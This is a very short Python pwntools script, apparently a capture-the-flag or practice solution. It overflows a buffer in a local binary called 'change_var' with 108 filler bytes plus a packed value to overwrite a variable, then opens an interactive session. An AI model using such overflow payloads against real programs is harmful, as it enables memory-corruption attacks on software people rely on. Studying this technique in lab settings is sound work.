from pwn import *


p = process("./change_var")


payload = b"A"*108 + p32(0x32)
p.sendlineafter(b"\n", payload);
p.interactive()
